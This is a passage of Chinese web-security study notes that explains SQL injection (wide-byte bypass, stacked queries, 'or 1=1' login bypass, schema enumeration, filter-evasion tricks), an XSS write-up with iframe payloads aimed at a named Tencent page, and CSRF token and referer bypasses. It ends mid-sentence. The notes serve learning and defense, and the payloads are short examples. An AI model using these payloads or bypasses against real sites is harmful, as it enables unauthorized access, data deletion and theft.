<p>MYSQL默认字符集是GBK等宽字节字符集。如上图所示%df’被PHP转义，单引号被加上反斜杠\，变成了%d’，其中\的十六进制是%5C，那么现在%d’&#x3D;%d%5C%27,如果程序的默认字符集是GBK等宽字节字符集，MYSQL用GBK编码时，会认为%df%5C是一个宽字符，也就是縗，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就可以注入了</p>
<p>用来绕过<strong>addslashes</strong></p>
<h4 id="③按照注入点类型来分类："><a href="#③按照注入点类型来分类：" class="headerlink" title="③按照注入点类型来分类："></a>③按照注入点类型来分类：</h4><p>  （1）数字型注入点：许多网页链接有类似的结构 <code>http://xxx.com/users.php?id=1</code> 基于此种形式的注入，其注入点 id 类型为数字若存在注入点，则可以利用网页通过此种结构传递id等信息的原理，构造出类似如下的sql注入语句进行爆破：select * from 表名 where id&#x3D;1 and 1&#x3D;1</p>
<p>  （2）字符型注入点：网页链接有类似的结构 <code>http://xxx.com/users.php?name=admin</code> 这种形式，其注入点 name 类型为字符类型，若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where name&#x3D;‘admin’ and 1&#x3D;1 ’</p>
<p>  （3）搜索型注入点：这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 “keyword&#x3D;关键字” 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where 字段 like ‘%测试%’ and ‘%1%’&#x3D;’%1%’</p>
<h4 id="④基于程度和顺序的注入-哪里发生了影响"><a href="#④基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="④基于程度和顺序的注入(哪里发生了影响)"></a>④基于程度和顺序的注入(哪里发生了影响)</h4><p><code>★一阶注射</code> </p>
<p><code>★二阶注射</code> </p>
<blockquote>
<p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；</p>
<p>二阶注入类似存储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间接的对 WEB 产生危害，这样的就被称为是二阶注入. </p>
</blockquote>
<h4 id="1-堆叠注入"><a href="#1-堆叠注入" class="headerlink" title="1.堆叠注入"></a>1.堆叠注入</h4><h5 id="1-堆叠注入定义"><a href="#1-堆叠注入定义" class="headerlink" title="1.堆叠注入定义"></a>1.堆叠注入定义</h5><blockquote>
<p>   Stacked  injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在  mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。</p>
</blockquote>
<h5 id="2-堆叠注入原理"><a href="#2-堆叠注入原理" class="headerlink" title="2.堆叠注入原理"></a>2.堆叠注入原理</h5><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。<u>试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入</u>。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<u>union 或者union all执行的语句类型是有限的，可以用来执行查询语句</u>，而<u>堆叠注入可以执行的是任意的语句</u>。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：  <code>Select * from products where productid=1;DELETE FROM products</code>当执行查询后，<u><strong>第一条显示查询信息</strong></u>，<u><strong>第二条则将整个表进行删除</strong></u>。</p>
<h5 id="3-堆叠注入的局限性"><a href="#3-堆叠注入的局限性" class="headerlink" title="3.堆叠注入的局限性"></a>3.堆叠注入的局限性</h5><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p><strong>下面我以一道题为例解析堆叠注入，该题来自于<a href="../../../../2022/06/21/buuctf-wp"> buuctf的[强网杯 2019]随便注 </a></strong></p>
<h4 id="2-无列名注入"><a href="#2-无列名注入" class="headerlink" title="2.无列名注入"></a>2.<a href="https://www.cnblogs.com/Lee-404/p/12833788.html">无列名注入</a></h4><p>上面链接是一篇大佬讲解的无列名注入，之前刷攻防世界遇到类似的题目，看了这篇文章学到了新技巧</p>
<h4 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="*3.联合注入"></a>*3.联合注入</h4><p><strong>联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据</strong></p>
<p>举个例子：<br>最初users表中只有一行数据，</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220909230928678.png"><img src="/Web-study/image-20220909230928678.png" alt="image-20220909230928678"></a></p>
<p><strong>我们通过<code>union select</code>查询就可以构造一行虚拟的数据，</strong></p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220909231009396.png"><img src="/Web-study/image-20220909231009396.png" alt="image-20220909231009396"></a></p>
<p>这样，我们在users表中利用联合查询创建了一行虚拟的数据。</p>
<hr>
<h3 id="1-几个常用函数"><a href="#1-几个常用函数" class="headerlink" title="1.几个常用函数"></a>1.几个常用函数</h3><blockquote>
<p>1.<code>version()</code>——MySQL 版本 </p>
<p>2.<code>user()</code>——数据库用户名 </p>
<p>3.<code>database()</code>——数据库名 </p>
<p>4.<code>@@datadir</code>——数据库路径 </p>
<p>5.<code>@@version_compile_os</code>——操作系统版本</p>
</blockquote>
<h3 id="2-一般用于尝试的闭合语句"><a href="#2-一般用于尝试的闭合语句" class="headerlink" title="2.一般用于尝试的闭合语句"></a>2.一般用于尝试的<u>闭合语句</u></h3><p>Ps:&#96;&#96;–+可以用#替换，url 提交过程中 Url 编码后的#为%23，–和#为注释符，把后面语句注释掉，使其无法执行&#96;</p>
<blockquote>
<p>有时用–+，而不用#的原因是，http无法解释#，所以用–+来代替，<br>–+中起到注释作用其实是–，但是如果单纯的–会和后面的内容连上从而导致sql语句出错，所以有了+会解释为空格，从而避免报错<br>故<br>–%20   &lt;&#x3D;&#x3D;&gt;   –+</p>
</blockquote>
<blockquote>
<p>or 1&#x3D;1–+</p>
<p>‘or 1&#x3D;1–+</p>
<p>“or 1&#x3D;1–+</p>
<p>)or 1&#x3D;1–+</p>
<p>‘)or 1&#x3D;1–+</p>
<p>“) or 1&#x3D;1–+</p>
<p>“))or 1&#x3D;1–+</p>
</blockquote>
<h3 id="3-sql中逻辑运算【万能密码的原理】"><a href="#3-sql中逻辑运算【万能密码的原理】" class="headerlink" title="3.sql中逻辑运算【万能密码的原理】"></a>3.sql中逻辑运算【万能密码的原理】</h3><p>提出一个问题 <code>Select * from users where id=1 and 1=1</code>;这条语句为什么能够选择出 id&#x3D;1 的内容，and 1&#x3D;1 到底起作用了没有？这里就要清楚 sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>我们可以用 <code>’or 1=1#</code> 作为密码输入。原因是为什么？ </p>
<p>这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的 sql 语句为： </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Select * <span class="keyword">from</span> admin where <span class="attribute">username</span>=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;&#x27;</span>or <span class="attribute">1</span>=1#&#x27;</span><br></pre></td></tr></table></figure>

<p>Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句 <code>username=&#39;admin&#39; and password=&#39;&#39;or 1=1</code>。三个条件用 and 和 or 进行连接。在 sql 中，我们 <u><strong>and 的运算优先级大于 or 的元算优先级</strong></u>。因此可以看到 <u><strong>第一个条件（用 a 表示）是真的，第二个条件（用 b 表示）是假的，a and b &#x3D; false</strong></u>,第一个条件和第二个条件执行 and 后是假，再与<u><strong>第三 个条件 or 运算，因为第三个条件 1&#x3D;1 是恒成立的，所以结果自然就为真了</strong></u>。因此上述的语 句就是恒真了</p>
<p>ps.<strong><code>逻辑语句的区别</code></strong></p>
<blockquote>
<p>1.and:两个或多个条件同时满足，才为真（显示一条数据）</p>
<p>2.or:两个或多个条件满足其中一个即为真（显示一条数据）</p>
<blockquote>
<p>使用and语句注意<code>select * from test where a = 1 and a = 2</code>这样操作肯定不行，<u><strong>后面的一个值会把前面的值给覆盖掉</strong></u>，最后执行的是<code>select * from test where a = 2</code></p>
<p>而用or语句的话<code>select * from test where a = 1 or a = 2</code>,执行<code>select * from test where a = 1</code>,若<code>a=1</code>为假，则执行<code>select * from test where a = 2</code></p>
</blockquote>
</blockquote>
<blockquote>
<p>3.union:联合查询，将<u><strong>多个查询结果合并（如果有一个结果为空，不影响其他结果合并）</strong></u>起来时，<u><strong>系统会自动去掉重复元组</strong></u></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里注意，如果id&#x3D;1，那么结果合并时，就会覆盖后面的结果，所以这里需要前面的语句返回为空，那么后面的数据就会显现出来</p>
</blockquote>
<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。 </p>
<h3 id="4-注入的一般流程【按顺序查询注入】"><a href="#4-注入的一般流程【按顺序查询注入】" class="headerlink" title="4.注入的一般流程【按顺序查询注入】"></a>4.注入的一般流程【按顺序查询注入】</h3><h4 id="ps-关键记忆和使用"><a href="#ps-关键记忆和使用" class="headerlink" title="ps.关键记忆和使用"></a>ps.关键记忆和使用</h4><blockquote>
<p>schema_name 数据库名</p>
<p><code>information_schema.schemata</code> 全部数据库</p>
<p><code>table_name</code> 表名</p>
<p><code>information_schema.tables</code> 全部表</p>
<p><code>table_schema=’xxxxx’</code> ‘xxxx’为目标表所在的数据库名</p>
<p><code>column_name</code> 列名</p>
<p><code>information_schema.columns</code> 全部列名</p>
<p><code>table_name=’xxxxx’</code> ‘xxxx’想要查询数据所在的表名</p>
</blockquote>
<h4 id="1-注入语句"><a href="#1-注入语句" class="headerlink" title="[1] 注入语句"></a>[1] 注入语句</h4><blockquote>
<p>1）猜数据库 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select schema_name from information_schema.schemata</code> </p>
<p>2）猜某库的数据表 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select table_name from information_schema.tables where table_schema=’xxxxx’</code> </p>
<p>3）猜某表的所有列【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select column_name from information_schema.columns where table_name=’xxxxx’</code> </p>
<p>4）获取某列的内容 【以下语句功能，显示该列】</p>
<p><code>select column_name  from  table_name</code></p>
</blockquote>
<h4 id="2-注入流程图"><a href="#2-注入流程图" class="headerlink" title="[2] 注入流程图"></a>[2] 注入流程图</h4><p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154919325.png"><img src="/Web-study/image-20230803154919325.png" alt="image-20230803154919325"></a></p>
<h3 id="5-mysql错误分析解决"><a href="#5-mysql错误分析解决" class="headerlink" title="5.mysql错误分析解决"></a>5.mysql错误分析解决</h3><h4 id="1）子查询结果多于一行"><a href="#1）子查询结果多于一行" class="headerlink" title="1）子查询结果多于一行"></a>1）子查询结果多于一行</h4><p><code>Subquery returns more than 1 row</code></p>
<p>以<code>select * from table1 where table1.colums=(select columns from table2)</code>这个sql语句为例</p>
<blockquote>
<p>1.如果是写入重复，去掉重复数据。然后写入的时候，可以加逻辑判断(php)或者外键(mysql)，防止数据重复写入。（但在实际开发中可能需要重复写入，所以需要慎重考虑）</p>
<p>2.在子查询条件语句加<code>limit 1</code>,找到一个符合条件的就可以了<br><code>select * from table1 where table1.colums in (select columns from table2 limit 1)</code> </p>
<p>如果需要继续向后查询，可以用<code>limit 0,1</code>   <code>limit 1,1</code>   <code>limit 2,1</code>   …..  <code>limit n,1</code></p>
<p>3.在子查询前加any关键字<br>&#96;select * from table1 where table1.colums&#x3D;any(select columns from table2)</p>
</blockquote>
<h4 id="ps-子查询语句"><a href="#ps-子查询语句" class="headerlink" title="ps. 子查询语句"></a>ps. 子查询语句</h4><p><strong>子查询</strong>是指在<strong>一个select语句中嵌套另一个slecet语句</strong>。</p>
<p><strong>any、in、some、all</strong>分别是子查询关键词之一。</p>
<p><strong>any</strong>可以与&#x3D;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&lt;&gt;结合起来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的任何一个数据。</p>
<p>all可以与&#x3D;、&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&lt;&gt;结合是来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的其中的所有数据。</p>
<p>他们进行子查询的语法如下：</p>
<blockquote>
<p><code>operand comparison_operator any(subquery);</code><br><code>operand in (subquery);</code><br><code>operand coparison_operator some(subquery);</code><br><code>operand coparison_operator all (subquery);</code></p>
</blockquote>
<p><strong>any,all关键词必须与一个比较操作符一起使用</strong></p>
<p>any关键词可以理解为<strong>对于子查询返回的列中的<u>任意</u>数值，如果比较结果为ture，则返回true</strong><br>例如：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1 &gt; <span class="keyword">any</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> t2)</span><br></pre></td></tr></table></figure>

<p>假设表t1中有一行包含（10） ， t2包含（20,12,5），则表达式为true；如果t2包含（20,10），或者表t2位空表，则表达式为false。如果t2包含（null，null），则表达式为unkonwn。</p>
<p>all关键词<strong>对于子查询返回的列中的<u>所有值</u>，如果比较结果为true，则返回true</strong><br>例如：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> s1 <span class="keyword">from</span> t1 <span class="keyword">where</span> s1&gt; <span class="keyword">all</span> (<span class="keyword">select</span> s1 <span class="keyword">from</span> s2)</span><br></pre></td></tr></table></figure>

<p>假设表t1中有一行包含（10）。如果表t2包含（-5,0，+5），则表达式为true，因为10比t2中的查出的所有三个值大。如果表t2包含（12,6，null，-100），则表达式为false，因为t2中有一个值12大于10。如果表t2包含（0，null，1），则表达式为unknown。如果t2为空表，则结果为true。</p>
<p>not in 是 “&lt;&gt;all”的别名，用法相同。<br>语句in 与“&#x3D;any”是相同的。<br>例如：</p>
<p><code>select s1 from t1 where s1 = any (select s1 from t2)</code><br><code>select s1 from t1 where s1 in (select s1 from t2)</code></p>
<p>语句some是any的别名，用法相同。<br>例如：</p>
<p><code>select s1 from t1 where s1 &lt;&gt; any (select s1 from t2)</code><br><code>select s1 from t1 where s1 &lt;&gt; some (select s1 from t2)</code></p>
<h3 id="6-mysql-连接函数，-分组连接函数"><a href="#6-mysql-连接函数，-分组连接函数" class="headerlink" title="6.mysql 连接函数， 分组连接函数"></a>6.mysql 连接函数， 分组连接函数</h3><blockquote>
<h5 id="1-concat"><a href="#1-concat" class="headerlink" title="1.concat()"></a>1.concat()</h5><p>concat(str1,str2,…)</p>
<p>若有一个参数为NULL，返回NULL</p>
<h5 id="2-concat-ws"><a href="#2-concat-ws" class="headerlink" title="2.concat_ws()"></a>2.concat_ws()</h5><p>concat_ws(‘间隔符号’,str1,str2,…)</p>
<p><strong>间隔符号可以是空格，不能不写，否则返回为空</strong></p>
<p>显示为str1间隔符号str2间隔符号str3…</p>
<h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat"></a>3.group_concat</h5><p>group_concat([distinct] 字段名 [ order by 排序字段 asc&#x2F;desc ] [separator “分隔符”])</p>
<p>多行数据在一行显示函数</p>
<p>根据group by指定的列进行排序分组，将同一组显示出来，并用分隔符间隔</p>
<h5 id="ps-组合使用"><a href="#ps-组合使用" class="headerlink" title="ps. 组合使用"></a>ps. 组合使用</h5><p>如果是多字段组合 显示在一行的eg：</p>
<p>group_concat(concat_ws(‘,’,concat(str1，str2) ) )；</p>
<p>一个字段的话eg：</p>
<p>group_concat(concat_ws(‘,’,str1，str2) )； </p>
</blockquote>
<h3 id="7-过滤替换"><a href="#7-过滤替换" class="headerlink" title="*7.过滤替换"></a>*7.过滤替换</h3><h4 id="1）双写绕过"><a href="#1）双写绕过" class="headerlink" title="1）双写绕过"></a>1）双写绕过</h4><blockquote>
<p>(用于把黑名单的字符替换成空)：se<u>select</u>lect,un<u>union</u>ion，oorr等等（替换为空后，剩余语句就是标准的sql语句，不会影响语句的正常执行）</p>
<p>ps.注意，有的语句命令可能会带有黑名单的字符，也需要双写，如<u>or</u>der,inf<u>or</u>mation.schema_schemata等，当网站在检查时，同样会被替换为空，所以需要写成o<u>or</u>rder,info<u>or</u>rmation.schema_schemata等等</p>
</blockquote>
<h4 id="2）大小写混合"><a href="#2）大小写混合" class="headerlink" title="2）大小写混合"></a>2）大小写混合</h4><blockquote>
<p>(用于黑名单中只有小写或大写，并没有对大小写进行区分)</p>
<p>如sEleCt,unIoN等等</p>
</blockquote>
<h4 id="3）替换"><a href="#3）替换" class="headerlink" title="*3）替换"></a>*3）替换</h4><blockquote>
<p>select：</p>
<p>union：</p>
<p>空格：<code>%0a</code>（分隔符）,<code>%a0</code>，<code>%09</code>(tab), <code>/**/</code>, () 【如select(table_name)from(xxx)】，&lt; &gt;， %20(space),  IFS$9（$IFS是<strong>Unix</strong>系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</p>
<p>&#x3D;：like</p>
<p>and：&amp;&amp;</p>
<p>or：||</p>
<p>#,– : <code>;%00</code></p>
<p>，：用<code>join</code>来代替逗号</p>
</blockquote>
<h4 id="8-注释符"><a href="#8-注释符" class="headerlink" title="8. 注释符"></a>8. 注释符</h4><blockquote>
<p>#、 –+、 –%20、 %23</p>
</blockquote>
<h2 id="二、xss"><a href="#二、xss" class="headerlink" title="二、xss"></a>二、xss</h2><p>把<code>xss-labs</code>做一下就差不多了，后面进阶内容按是需要学习吧</p>
<h3 id="Dom-Xss进阶-善变iframe"><a href="#Dom-Xss进阶-善变iframe" class="headerlink" title="Dom Xss进阶 [善变iframe]"></a>Dom Xss进阶 [善变iframe]</h3><blockquote>
<p>作者：心伤的瘦子</p>
<p>来自：PKAV技术宅社区</p>
<p>网址：<a href="http://www.pkav.net/">http://www.pkav.net</a></p>
<p>转载于：<a href="https://blog.csdn.net/weixin_39934520/article/details/106151313">https://blog.csdn.net/weixin_39934520/article/details/106151313</a></p>
</blockquote>
<p>简要描述：</p>
<blockquote>
<p>有时候，输出还会出现在 </p>
<iframe src="[输出]"></iframe>  

<p>iframe 的 src属性本来应该是一个网址，</p>
<p>但是iframe之善变，使得它同样可以执行javascript，而且可以用不同的姿势来执行。</p>
<p>这一类问题，我将其归为<code>[路径可控]</code>问题。当然上面说到的是普通的反射型XSS。</p>
<p>有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src&#x3D;”[可控的url]”; 同样会导致XSS问题，来看看本例吧</p>
</blockquote>
<p>详细说明：</p>
<blockquote>
<p>1.先来说说iframe的变化。</p>
<p>1.1 最好懂的，onload执行js</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">οnlοad</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.2 src 执行javascript代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.3 IE下vbscript执行代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;vbscript:msgbox(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.4 <code>Chrome</code>下<code>data</code>协议执行代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.5 上面的变体</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.6 <code>Chrome</code>下<code>srcdoc</code>属性</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<ol start="2">
<li><p>有兴趣的，可以一个一个的去测试上面的效果，注意浏览器的特异性哦。</p>
</li>
<li><p>接着我们来看看具体的例子。</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&amp;gid=yl&amp;cid=68&amp;from=</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>我们先开调试工具，看看有没有可见的输出。</li>
</ol>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154936817.png"><img src="/Web-study/image-20230803154936817.png" alt="image-20230803154936817"></a></p>
<p>可以看到，我们参数的aaaaaa被带入到了<iframe src="这里"></iframe>。</p>
<p>这样一来，就满足了我们的使用条件。</p>
<p>我们试试</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);<span class="variable">&amp;gid</span>=yl<span class="variable">&amp;cid</span>=68<span class="variable">&amp;from</span>=</span><br></pre></td></tr></table></figure>

<p>。。竟然没反应。我们来看看刚才的那个地方。</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154959716.png"><img src="/Web-study/image-20230803154959716.png" alt="image-20230803154959716"></a></p>
<p>可以看到，src这次没属性了，看来腾讯做了什么过滤。我们继续搜索下一个toolframe试试。<br>恩，看来就是这段代码导致的。</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803155010542.png"><img src="/Web-study/image-20230803155010542.png" alt="image-20230803155010542"></a></p>
<p>一起看看这段代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">OpenFrame</span>(<span class="params">url</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (url.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;http://&#x27;</span>) != <span class="string">&#x27;-1&#x27;</span> || url.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;https://&#x27;</span>) != <span class="string">&#x27;-1&#x27;</span> || url.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;javascript:&#x27;</span>) != <span class="string">&#x27;-1&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;toolframe&quot;</span>).<span class="property">src</span> = url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不难看出，腾讯对 javascript:做出了判断。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;toolframe&quot;).src = url;</span><br></pre></td></tr></table></figure>

<p>这句是导致XSS的一句代码。而openFrame的url参数则来自于(无关代码省略)：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">var</span> tool_url = <span class="title function_">getQueryStringValue</span>(<span class="string">&quot;turl&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="title function_">openFrame</span>(tool_url);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>根据我们上面说道的iframe的利用方法，我们不难看出，腾讯的过滤是不完善的。</li>
</ol>
<p>在IE下，我们可以使用vbscript来执行代码。 vbscript里 ‘ 单引号表示注释，类似JS里的&#x2F;&#x2F;</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://helper.qq.com/appweb/tools/tool-detail.shtml?turl=vbscript:msgbox(<span class="number">1</span>)&#x27;&amp;gid=yl&amp;cid=<span class="number">68</span>&amp;from=</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803155021564.png"><img src="/Web-study/image-20230803155021564.png" alt="image-20230803155021564"></a></p>
<p>在chrome下，我们可以用data协议来执行JS。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=data:text/html,<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;&amp;gid=yl&amp;cid=68&amp;from=</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803155036805.png"><img src="/Web-study/image-20230803155036805.png" alt="image-20230803155036805"></a></p>
<h3 id="漏洞证明："><a href="#漏洞证明：" class="headerlink" title="漏洞证明："></a>漏洞证明：</h3><p>见详细说明</p>
<h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><blockquote>
<p><code>危险的不光是javascript:，</code></p>
<p><code>vbscript:, data: 等同样需要过滤。</code></p>
</blockquote>
<h2 id="三、csrf"><a href="#三、csrf" class="headerlink" title="三、csrf"></a>三、csrf</h2><h3 id="1）绕过token"><a href="#1）绕过token" class="headerlink" title="1）绕过token"></a>1）绕过token</h3><p>有的时候其实网站根本不验证<code>token</code>，但是在其他方面上它仍然在工作，所以为了绕过它可以考虑抓包删去<code>token</code>，从而正常访问</p>
<h3 id="2）绕过referer"><a href="#2）绕过referer" class="headerlink" title="2）绕过referer"></a>2）绕过referer</h3><h4 id="1-referer条件为空条件时"><a href="#1-referer条件为空条件时" class="headerlink" title="1.referer条件为空条件时"></a>1.referer条件为空条件时</h4><blockquote>
<p>解决方案:</p>
<p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>这个时候浏览器地址栏是<code>file://</code>开头的，</p>
<p>如果这个HTML页面向任何http站点提交请求的话，这些请求的<code>Referer</code>都是空的。</p>
<p>例:<br><code>1.利用data:协议</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>base64</code>编码 解码即可看到代码</p>
<p><code>2.利用https协议</code><br>https向http跳转的时候Referer为空<br>拿一个https的webshell</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;https://xxxxx.xxxxx/attack.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>attack.php写上CSRF攻击代码</p>
</blockquote>
<h4 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h4><blockquote>
<p>比如你找的csrf是<a href="https://link.zhihu.com/?target=http://xxx.com">http://xxx.com</a> </p>
<p>验证的referer是验证的*.<a href="https://link.zhihu.com/?target=http://xx.com">http://xx.com</a> </p>
<p>可以找个二级域名 之后&lt;img “csrf地址”&gt; 之后在把文章地址发出去 就可以伪造。</p>
</blockquote>
<h4 id="3-判断referer是否存在某关键字"><a href="#3-判断referer是否存在某关键字" class="headerlink" title="3.判断referer是否存在某关键字"></a>3.判断referer是否存在某关键字</h4><blockquote>
<p>referer判断存在不存在<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>这个关键词</p>
